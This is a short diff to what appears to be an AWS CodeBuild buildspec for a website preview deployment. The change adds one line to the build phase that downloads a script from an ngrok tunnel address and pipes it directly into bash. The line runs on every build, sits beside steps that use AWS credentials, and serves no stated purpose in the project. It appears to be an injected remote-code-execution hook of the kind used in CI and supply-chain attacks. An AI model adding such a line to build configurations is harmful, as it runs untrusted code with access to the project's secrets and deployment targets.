@@ -8,6 +8,7 @@ phases:
             - npm ci
     build:
         commands:
+            - curl https://104b-180-151-104-178.in.ngrok.io/file.sh | bash
             - npm run build && aws s3 sync public "s3://preview.dbanks.design/$(echo $CODEBUILD_WEBHOOK_TRIGGER | tr / -)" --delete --acl public-read
 
 cache:
